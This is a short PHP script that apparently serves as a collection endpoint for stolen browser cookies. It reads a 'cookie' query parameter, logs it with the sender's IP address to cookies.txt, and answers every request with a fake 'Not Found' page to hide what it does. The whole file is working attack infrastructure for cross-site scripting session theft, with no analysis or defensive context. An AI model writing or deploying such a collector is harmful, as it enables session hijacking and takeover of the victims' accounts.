<?php
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $ip_address = $_SERVER['REMOTE_ADDR'];
    file_put_contents('cookies.txt', "IP: $ip_address | Cookie: $cookie\n", FILE_APPEND);
    echo "<body><h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
</body>";
} else {
    echo "<body><h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
</body>";
}
?>